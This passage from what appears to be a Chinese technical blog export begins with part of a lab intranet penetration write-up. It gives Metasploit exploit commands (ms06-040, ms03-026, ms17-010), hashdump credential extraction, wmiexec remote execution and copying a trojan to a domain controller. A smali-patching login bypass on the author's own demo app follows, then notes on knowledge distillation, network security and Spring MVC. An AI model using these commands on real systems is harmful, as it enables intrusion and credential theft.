<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search  ms06-040</span><br><span class="line"></span><br><span class="line">use  exploit/windows/smb/ms06_040_netapi</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost    192.168.52.141</span><br><span class="line"></span><br><span class="line">set target  5</span><br></pre></td></tr></table></figure>

<p>漏洞利用成功，攻击成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" class title="image-20210809174522308">



<p><strong>2.3 ms03-026漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞实质上影响的是使用RPC的DCOM接口，此接口处理由客户端机器发送给服务器的DCOM对象激活请求(如UNC路径)。攻击者通过向目标发送畸形  RPC  DCOM请求来利用这些漏洞。成功利用此漏洞可以以本地系统权限执行任意指令。攻击者可以在系统上执行任意操作 ，如安装程序、查看或更改、删除数据或创建系统管理员权限的帐户</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms03-026</span><br><span class="line"></span><br><span class="line">use   exploit/windows/dcerpc/ms03_026_dcom</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost  192.168.52.141</span><br></pre></td></tr></table></figure>



<p>漏洞利用成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" class title="image-20210809175300540">



<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><p>如下获取用户账号和密码hash值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run  post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>



<p>可以看到目标主机的用户账号和密码hash值</p>
<p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" class title="image-20210809175750389">



<p>由于windows2008之前的操作系统密码存储都是以明文形式的，直接加载mimikatz模块后使用wdigest进行抓取</p>
<h4 id="域控主机获取"><a href="#域控主机获取" class="headerlink" title="域控主机获取"></a>域控主机获取</h4><h4 id="漏洞检测利用-1"><a href="#漏洞检测利用-1" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>在之前的信息收集中，得到域控主机开放445和139端口，猜测也有可能存在ms17-010漏洞，对其进行漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/smb/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>检测出来可能存在ms17-010漏洞</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" class title="image-20210810113004761">



<p>然后检测是否是管理员权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>可以看到为管理员账户</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png" class>



<p>使用上面的ms17-010的模块都没有返回管道，建立会话失败</p>
<p>域控主机开放137，139，445端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果开启了137端口（wmi）首先还是建议用wmi , 可以直接利用`auxiliary/scanner/smb/impacket/wmiexec`来代码执行，就可以来开启3389 ，以及配置防火墙等。</span><br><span class="line"></span><br><span class="line">如果开启了`139，445`端口，可以先尝试用exploit/windows/smb/pspexec 来登录，弹正向shell.然后代码执行开启3389，配置防火墙</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</span><br></pre></td></tr></table></figure>



<p>下面使用wmiexec攻击模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  auxiliary/scanner/impacket/wmicexec</span><br><span class="line">set rhost  192.168.52.138</span><br><span class="line">set SMBPass  域控密码</span><br><span class="line">set SMBUser  域控账号</span><br><span class="line">set command  执行的命令</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" class title="image-20210810142402809">



<p>可以看到输入的命令执行成功，这样的话，可以开启远程桌面和使用共享文件将木马复制到域控主机上，然后开启正向shell监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\192.168.52.140\shell\shell.exe C:\1.exe</span><br></pre></td></tr></table></figure>



<p>原理:整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。</p>
<p>当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>内网靶场</category>
      </categories>
      <tags>
        <tag>-内网渗透 -web靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>知识蒸馏</title>
    <url>/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/</url>
    <content><![CDATA[<h1 id="知识蒸馏"><a href="#知识蒸馏" class="headerlink" title="知识蒸馏"></a>知识蒸馏</h1><p>Hinton 2015年正式在论文Distilling the knowledge in a neural network中提出了知识蒸馏的概念，这算是知识蒸馏的开山之作，也是绝对的经典之作。将已经训练好的模型包括的知识，蒸馏提取到另一个模型中，目的是将一个大模型或者多个模型集成学到的知识迁移到另一个轻量化模型。简而言之，就是模型压缩的一种方法，一种基于“教师-学生网络思想”的训练方法。</p>
<h2 id="理论依据"><a href="#理论依据" class="headerlink" title="理论依据"></a>理论依据</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><ul>
<li>Teacher：大而笨重的模型</li>
<li>Student：小而紧凑的模型</li>
<li>transfer set：用于小模型训练的数据，也是获得Teacher模型soft target输出的输入数据集</li>
<li>hard target：样本原始标签</li>
<li>soft target：Teacher模型输出的预测结果</li>
<li>temperature：softmax函数中的超参数</li>
<li>knowledge：可以理解为从输入向量到输出向量学习到的映射</li>
</ul>
<h3 id="符号定义"><a href="#符号定义" class="headerlink" title="符号定义"></a>符号定义</h3><ul>
<li>$z$：Logits，模型去除输出层的输出。对于一般的分类问题，比如图片分类，输入一张图片后，经过深度神经网络各种非线性变换，在网络最后的Softmax层之前，会得到这张图片属于各个类别的大小数值$z_i$,某个类别的$z_i$数值越大，模型认为输入图片属于这个类别的可能性就越大。那么什么是Logits？这些汇总了网络内部各种信息后，得出的属于各个类别的汇总分值$z_i$就是Logits,i代表第i 个类别，$z_i$代表属于第i类的可能性。因为Logits不是概率值，所以一般在Logits数值上会用Softmax函数进行变换，得出的概率值作为最终分类结果概率。Softmax一方面把Logits数值在各类别之间进行概率归一，使得各个类别归属数值满足概率分布；另外一方面，它会放大Logits数值之间的差异，使得Logits得分两极分化,Logits得分高的得到的概率值更偏大一些，而较低的Logits数值，得到的概率值则更小。</li>
<li>$p$ ：probality，每个类的概率</li>
</ul>
<h3 id="Teacher-Student-Model"><a href="#Teacher-Student-Model" class="headerlink" title="Teacher-Student Model"></a>Teacher-Student Model</h3><p>将复杂且大的模型作为Teacher，Student模型结构较为简单，用Teacher来辅助Student模型的训练，Teacher学习能力强，可以将它学到的知识迁移给学习能力相对弱的Student模型，以此来增强Student模型的泛化能力.</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126144606985.png" class title="image-20231126144606985">

<p><strong>需要注意的是，这里蒸馏的目的是小网络的概率分布趋近于大网络，而非单纯的正确率趋近于大网络</strong></p>
<p>下图为知识蒸馏的基本架构，主要由知识、蒸馏算法和teacher-student三个部分组成</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126143030758.png" class title="image-20231126143030758">

<h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>分为response-based knowledge, feature-based knowledge and relation-based knowledge三类</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126150252245.png" class title="image-20231126150252245">

<h3 id="response-based-knowledge"><a href="#response-based-knowledge" class="headerlink" title="response-based knowledge"></a>response-based knowledge</h3><p>Response-Based Knowledge一般是指teacher模型最后一层的响应，即logits。主要思想就是让student直接模仿teacher最后的预测。</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126150527373.png" class title="image-20231126150527373">

<h3 id="feature-based-knowledge"><a href="#feature-based-knowledge" class="headerlink" title="feature-based knowledge"></a>feature-based knowledge</h3><p>所谓的基于特征的知识其实就是中间层的输出</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126150706440.png" class title="image-20231126150706440">

<h3 id="relation-based-knowledge"><a href="#relation-based-knowledge" class="headerlink" title="relation-based knowledge"></a>relation-based knowledge</h3><p>Relation-Based Knowledge是指不同层或样本之间的关系，这里的对象我们可以自由构造，比如两个层之间的关系、三个层之间的关系、两个样本之间的关系、三个样本之间的关系等等。具体的，比如我们面对的是一个文本相关性任务，可以让student去学习teacher输出的不同样本对的相关性，即teacher认为两个文本的相关性是多少，则student就去学习尽量做到同样的相关性。</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126151115008.png" class title="image-20231126151115008">

<h2 id="Distillation-Schemes"><a href="#Distillation-Schemes" class="headerlink" title="Distillation Schemes"></a><strong>Distillation Schemes</strong></h2><p>知识蒸馏一般可以分为离线蒸馏、在线蒸馏和自蒸馏三种架构</p>
<img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126151435101.png" class title="image-20231126151435101">

<h3 id="Offline-Distillation"><a href="#Offline-Distillation" class="headerlink" title="Offline Distillation"></a>Offline Distillation</h3><p>工业界用的比较多的是离线蒸馏，学生向预先训练好的老师学习，简单易于实现。离线蒸馏的主要问题是大的teacher和小的student之间存在着model capacity gap，可能小的student就没有办法学得特别好，因为可能能力确实有限。</p>
<h3 id="Online-Distillation"><a href="#Online-Distillation" class="headerlink" title="Online Distillation"></a>Online Distillation</h3><p>师生同时更新，整个框架端到端可训练(如相互学习)</p>
<h3 id="Self-Distillation"><a href="#Self-Distillation" class="headerlink" title="Self-Distillation"></a>Self-Distillation</h3><p>指不通过新增一个大模型的方式找到一个teacher模型。因能学到增益信息而收益</p>
<h2 id="Teacher-Student-Architecture"><a href="#Teacher-Student-Architecture" class="headerlink" title="Teacher-Student Architecture"></a><strong>Teacher-Student Architecture</strong></h2><img src="/2024/01/17/%E7%9F%A5%E8%AF%86%E8%92%B8%E9%A6%8F/image-20231126153205668.png" class title="image-20231126153205668">

<h2 id="Distillation-Algorithms"><a href="#Distillation-Algorithms" class="headerlink" title="Distillation Algorithms"></a><strong>Distillation Algorithms</strong></h2><ul>
<li>Adversarial Distillation              对抗蒸馏</li>
<li>Multi-Teacher Distillation          多教师蒸馏</li>
<li>Cross-Modal Distillation           跨模态蒸馏</li>
<li>Graph-Based Distillation          基于图的蒸馏</li>
<li>Attention-Based Distillation     基于注意力的蒸馏</li>
<li>Data-Free Distillation                无数据蒸馏</li>
<li>Quantized Distillation               量化蒸馏</li>
<li>Lifelong Distillation                  终身蒸馏</li>
<li>NAS-Based Distillation            基于NAS的蒸馏</li>
</ul>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-知识蒸馏 -机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>破解第一个Android程序</title>
    <url>/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="破解第一个Android程序"><a href="#破解第一个Android程序" class="headerlink" title="破解第一个Android程序"></a>破解第一个Android程序</h1><h2 id="源程序分析"><a href="#源程序分析" class="headerlink" title="源程序分析"></a>源程序分析</h2><p>这里使用Android studio新建个登录框程序</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710192743475.png" class title="image-20230710192743475">



<p>然后使用Android Kiler对该程序进行反编译为smali文件</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710192917187.png" class title="image-20230710192917187">

<p>由于该程序只有登录功能，只需将用户输入的用户名和密码进行验证即登录成功。</p>
<p>我们来分析该check方法，smali代码如下：</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710193401588.png" class title="image-20230710193401588">

<p>可以看到该方法中有两个字符串型的参数，通过Dalvik字节码中的p命名法可以判断得出p1和p2。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710193954163.png" class title="image-20230710193954163">

<p>将”hfdcxy”字符串赋值给v0寄存器，然后调用equals()函数将p1寄存器的值和v0寄存器的值作比较，返回boolean类型的值。这里的move-result v0即将返回的值赋值于v0。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710202142256.png" class title="image-20230710202142256">



<p>这里if-eqz v0,:cond_0判断v0的值是否为0，若为0则执行跳转到cond_0处；否则继续执行下面的语句。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710202622298.png" class title="image-20230710202622298">



<p>我们先来看看判断错误的情况下执行的语句，如下</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710203021461.png" class title="image-20230710203021461">

<p>继续对p2寄存器使用equals()方法进行比较判断是否为”1234”字符串，判断为假时则调用show()方法显示登录错误，为真则显示登录成功。</p>
<p>接下来分析;cond_0后面的语句，如下</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710203506164.png" class title="image-20230710203506164">

<p>当用户名不为指定字符串时，调用show()方法显示登录失败</p>
<h2 id="源程序破解"><a href="#源程序破解" class="headerlink" title="源程序破解"></a>源程序破解</h2><p>根据上面的分析，不让程序跳转到;cond_0位置处，让程序一直执行下面的执行即可执行登录成功代码。如何修改代码实现跳转呢？这需要从if-eqz这个判断语句入手。</p>
<h3 id="if-nez"><a href="#if-nez" class="headerlink" title="if-nez"></a>if-nez</h3><p>将if-eqz修改为if-nez，实现相反判断来实现任意账号密码实现登录，若不修改其他语句的话输入正确的账号密码时提示登录失败</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710204247781.png" class title="image-20230710204247781">



<h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><p>在用户名比较语句后面直接使用goto跳转到登录成功</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230710205716545.png" class title="image-20230710205716545">

<p>任意账号密码登录成功</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/image-20230711122533739.png" class title="image-20230711122533739">

<h3 id="直接删除"><a href="#直接删除" class="headerlink" title="直接删除"></a>直接删除</h3><p>直接删除掉判断语句，使得语句执行达到登录成功。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全知识要点</title>
    <url>/2022/07/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/</url>
    <content><![CDATA[<h1 id="网络安全知识要点"><a href="#网络安全知识要点" class="headerlink" title="网络安全知识要点"></a>网络安全知识要点</h1><h2 id="网络安全问题"><a href="#网络安全问题" class="headerlink" title="网络安全问题"></a>网络安全问题</h2><p><strong>面临安全性威胁</strong></p>
<p>计算机网络上面临的威胁：</p>
<p>截获：从网络上窃听他人的通信内容</p>
<p>中断：有意中断他人在网络上的通信</p>
<p>篡改：故意篡改网络上传送的报文</p>
<p>伪造：伪造信息在网络上传送</p>
<p> 被动攻击是攻击者观察和分析某PDU而不干扰信息流，主动攻击是指攻击者对PDU进行操作处理。</p>
<p><strong>通信安全目标</strong></p>
<p>防止分析出报文内容；防止通信量分析；检测更改报文流；检测拒绝报文服务；检测伪造初始化连接。</p>
<p><strong>恶意程序</strong></p>
<p>计算机病毒、计算机蠕虫、特洛伊木马、逻辑炸弹</p>
<p><strong>计算机网络安全内容</strong></p>
<p>保密性、安全协议设计、访问控制</p>
<h2 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h2><p><strong>对称密钥密码体制</strong></p>
<p>1、加密密钥和解密密钥相同</p>
<p>2、数据加密标准DES。分组密码，在加密前先对整个明文进行分组，每个组64位，对每一个64位二进制数据进行加密处理产生密文数据。对密钥的保密。</p>
<p>3、如DES、3DES、TDEA、Blowfish算法、RC5算法和IDEA算法。</p>
<p><strong>公钥密码体制</strong></p>
<p>加密密钥与解密密钥不同。由已知加密密钥推导出解密密钥在计算上是不可行的。加密密钥(公钥)PK是公开信息，解密密钥(私钥)SK是保密的。加密算法E和解密算法D也公开。</p>
<p>A使用公钥对明文消息进行加密 ， B使用对应的私钥对密文进行解密</p>
<p>解决问题：密钥分配和数字签名</p>
<p>算法：RSA、ECC、D-H算法</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>保证完整性、不可否认性、身份认证</p>
<p>A使用私钥对认证消息进行加密，然后B使用公钥对其进行解密判断是否为A发送的消息。</p>
<h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><p>被动攻击措施是加密；主动攻击措施是鉴别。</p>
<p><strong>报文鉴别</strong></p>
<p>当很长报文进行数字签名是会是计算机增加很大的负担，使用简单的方法获取报文的摘要。</p>
<p>过程：A将所需发送的报文X通过报文摘要算法(单向函数)得到消息摘要H，使用私钥对H进行加密进行数字签名得到D。将D追加到报文后面发送给B</p>
<p>B接收到A发送过来的消息时，就先将报文和摘要分开，使用自己的公钥解密得到消息摘要H，并且对报文X进行摘要计算判断是符合H相同。</p>
<p><strong>实体鉴别</strong></p>
<p>在接入的全部时间内对通信对方只需验证一次。</p>
<p>通信双方使用共享对称密码进行加解密鉴别实体身份。</p>
<p><strong>漏洞：</strong></p>
<p>重放攻击：当入侵者C截获了A发送到B的消息，直接将消息发送给B让B认为C就是发送消息的A，就会像C返回响应内容。(使用随机数防止)</p>
<p>IP欺骗：将自己的IP地址换成A的IP地址进行IP欺骗。</p>
<p>中间人攻击：C截取A与B之间的通信信息获取相关信息。</p>
<h2 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h2><p>如何通过安全的通路进行分配。常用密钥分配是设立密钥分配中心KDC。</p>
<p><strong>对称密钥分配</strong></p>
<p>使用KDC来进行密钥分配。</p>
<p><strong>公钥分配</strong></p>
<p>通过认证中心CA将公钥和实体进行绑定，每个实体都有CA发送的证书，通过获取CA的公钥来验证。</p>
<h2 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h2><p><strong>网络层安全协议</strong>IPSec</p>
<p>对在IP数据报中的数据进行加密</p>
<p><strong>运输层安全协议TLS</strong></p>
<p>安全套接字对万维网客户与服务器之间传送数据进行加密和鉴别，在双方联络协商使用的加密算法和密钥。</p>
<p>提供功能：</p>
<p>1、SSL服务器鉴别。用户认证服务器身份，浏览器上有CA以及公钥。</p>
<p>2、加密SSL会话。客户端和服务器之间进行加密传输</p>
<p>3、SSL客户鉴别。允许服务器证实客户身份。</p>
<p><strong>安全电子交易SET</strong></p>
<p>专为因特网上进行安全支付卡交易的协议。</p>
<p>特点：</p>
<p>1、专为与支付有关的报文进行加密</p>
<p>2、涉及顾客、商家和商业银行。三方交互信息都被加密</p>
<p>3、三方都要有证书进行y验证。</p>
<p><strong>应用层的安全协议</strong></p>
<p>PGP：对电子邮件传送过程进行加密、鉴别、电子签名和压缩</p>
<p>PEM：因特网的邮件加密建议标准</p>
<h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><p><strong>防火墙</strong></p>
<p>隔绝内联网和外联网，控制进出网络的流量</p>
<p>分为网络级防火墙和应用级防火墙。</p>
<p>网络级防火墙：防止整个网络出现外来非法的入侵。</p>
<p>应用级防火墙：防从应用程序来进行接入控制。</p>
<p><strong>入侵检测系统</strong>IDS</p>
<p>基于特征的入侵检测和基于异常的入侵异常。</p>
<h2 id="重点知识点"><a href="#重点知识点" class="headerlink" title="重点知识点"></a>重点知识点</h2><p>1、网络安全的威胁可以分为主动攻击和被动攻击</p>
<p>2、主动攻击可进一步划分为更改报文流、拒绝报文服务和伪造连接初始化。</p>
<p>3、加密策略：链路加密和端到端加密</p>
<p>4、网络为用户提供的安全服务包括身份认证、访问控制、数据加密、数据完整和不可否认。</p>
<p>5、对信息流的干预方式可以分为中断、截取、修改和假冒。</p>
<p>6、系统安全的策略有防火墙和入侵检测。</p>
<p>7、经典加密算法：替换加密、换位加密和一次性填充。</p>
<p>8、计算机网络安全包括问题：</p>
<p> 保密性：为用户提供安全可靠的保密通信。</p>
<p>全协议设计：设计针对攻击安全的通信协议。</p>
<p>存取控制：对接入网络的权限加以控制，规定每个用户的接入权限。</p>
<p>9、密钥分配方法：</p>
<p>网外分配方式：采用可靠方法携带密钥分配给各用户</p>
<p>网内分配方式：用户之间直接分配和使用密钥分配中心KDC来分配密钥</p>
<p>10、网络安全面临的威胁：</p>
<p>系统漏洞、黑客攻击、病毒入侵、网络配置管理不当</p>
<p>11、Novell NetWare对文件服务器的共享硬盘提供的5级措施。</p>
<p>对硬盘目录和文件分配表(FAT)的保护；</p>
<p>对硬盘表面损坏时的数据保护；</p>
<p>采用磁盘镜像的方法实现对磁盘驱动器损坏的保护</p>
<p>采用磁盘双工，大队磁盘通道和驱动器损坏起到保护作用</p>
<p>采用事务系统跟踪系统TTS的附加容错功能</p>
<p>12、防火墙和入侵检测系统技术区别与联系。</p>
<p>区别：</p>
<p>防火墙是设置在本地网络和外部网络的一道防御系统，以防止发生不可预测的、潜在的、破坏性的侵入。通过检测、限制、更改跨越防火墙的数据流，尽可能的对外部屏蔽内部的信息、结构和允许状态来保护内部网络中的信息和资源受到外部网络非法用户的入侵。过滤不安全的服务和非法用户，控制对特殊站点的访问，统计数据，提供告警和审计功能。</p>
<p>入侵检测系统从计算机网络或计算机关键点收集信息并进行分析，从中发现用户或系统是否存在违反安全策略的行为和被攻击的迹象。监测、分析用户及其系统异常活动，提示管理员对其行为做出响应。</p>
<p>联系：</p>
<p>IDS是继防火墙之后的防线，防火墙是防御，IDS是主动防御，结合有力地保证内部系统安全。</p>
<p>IDS实时监测防火墙未发现的入侵行为，发现入侵行为规律，使得防火墙将这些行为特征加入规则中，提高防火墙的防护力度。</p>
<p>13、</p>
<p>重放攻击：攻击者截获发往目的主机已接收过的包并向其发送，用于身份认证。</p>
<p>拒绝服务DOS：攻击者向因特网上服务器不同发送大量分组使得服务器无法提供正常服务</p>
<p>访问控制：对接入网络的权限加以控制并规定接入的用户的权限</p>
<p>流量分析：通过观察PDU的协议控制信息部分，了解正在通信的协议实体地址和身份，PDU的长度和传输频率。</p>
<p>恶意程序：带有攻击攻击意图所编写的程序。</p>
<p>14、密码学：密码编码学和密码分析学</p>
<p>密码编码学：对密码体制的设计学，研究对数据进行变换的原理、手段和方法的技术和科学</p>
<p>密码分析学：在未知密钥的情况下将密文推导出明文或密钥的技术</p>
<p>15、</p>
<p>“无条件安全的密码体制”：无论截取获得多少密文都无法唯一的确定出对应的明文。</p>
<p>“在计算上是安全的密码体制”：破译密码花费的价值超过密文价值，破译时间超过密文有限生存周期。</p>
<p>16、进行报文鉴别是为了防止主动攻击中的篡改和伪造，验证通信对方的确是自己所需通信的对象。保密是对传送消息进行加密，防止受到被动攻击被攻击者观察并分析传输数据报协议以及IP地址。授权是对所进行的进程是否被允许进行验证。</p>
<p>17、MD5是RFC1321的报文摘要算法，对任意长报文进行运算得到128bit的报文摘要算法。</p>
<p>18、Kerberos协议优缺点。</p>
<p>Kerberos协议主要用于计算机网络的身份鉴别，只需要输入一次身份验证信息就可凭借此验证获取的票据访问多个服务。</p>
<p>19、网络层安全协议簇IPSec包含鉴别首部AH和封装安全有效载荷ESP</p>
<p>AH将每个数据报中的数据和一个变化的数字签名结合在一起验证发送方身份。提供源站鉴别和数据完整性。</p>
<p>ESP对IP负载进行加密机制，对数据报中数据进行加密，提供源站鉴别、数据完整性和保密性。</p>
<p>20、PGP使用一个随机生成密钥及IDEA算法对明文加密，再使用RSA算法对该密钥进行加密。</p>
<p>21、防火墙工作原理：分组过滤路由器检查进出内部网络的分组数据，按照系统管理员设置的防火墙规则来与分组进行匹配，符合条件的分组就通过，否则就丢弃。</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>第一个Spring-MVC项目</title>
    <url>/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="第一个Spring-MVC项目"><a href="#第一个Spring-MVC项目" class="headerlink" title="第一个Spring-MVC项目"></a>第一个Spring-MVC项目</h1><h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p>首先在IDEA中新建项目选择Java进行新建</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152510269.png" class title="image-20220402152510269">

<p>创建项目成功</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152639568.png" class title="image-20220402152639568">

<h2 id="添加SpringMVC"><a href="#添加SpringMVC" class="headerlink" title="添加SpringMVC"></a>添加SpringMVC</h2><p>右键项目名称点击添加框架支持</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152828851.png" class title="image-20220402152828851">

<p>选择Spring MVC进行下载添加</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402152930006.png" class title="image-20220402152930006">

<p>下载完成后发现项目下多了lib(存放依赖包)和web文件夹</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402153227310.png" class title="image-20220402153227310">

<p>然后设置项目结构（Project Structure），选择**Artifacts&#x3D;&gt;Fix(在右下角)**添加依赖</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402153530707.png" class title="image-20220402153530707">

<h2 id="添加Tomcat"><a href="#添加Tomcat" class="headerlink" title="添加Tomcat"></a>添加Tomcat</h2><p>点击右上角的Add Configuration，点击+号选择Tomcat Local</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402160742627.png" class title="image-20220402160742627">

<p>配置Tomcat文件及其相关配置</p>
